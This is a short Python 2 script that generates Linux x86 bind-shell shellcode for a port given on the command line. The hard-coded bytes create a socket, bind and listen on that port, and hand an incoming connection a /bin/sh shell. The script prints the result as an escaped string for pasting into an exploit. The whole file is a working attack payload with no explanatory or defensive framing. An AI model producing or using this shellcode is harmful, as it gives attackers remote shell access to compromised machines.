#!/usr/bin/python


import struct
import sys

#Usage: ./script <port number>
#example ./script.py 4444
x = sys.argv[1]


port = struct.pack("!H", int(x))

bind_shell = ("\x31\xc0\x31\xdb\x50\xb0\x66\xb3\x01\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc6\x52\x66\x68" + port +  
"\x66\x6a\x02\x89\xe1\xb0\x66\xb3\x02\x6a\x10\x51\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x52\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x52\x52\x56\x89\xe1\xcd\x80\x89\xc3\x31\xc9\xb1\x03\xfe\xc9\xb0\x3f\xcd\x80\x75\xf8\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xcd\x80")

print '"' + ''.join('\\x%02x' % ord(c) for c in bind_shell) + '";'
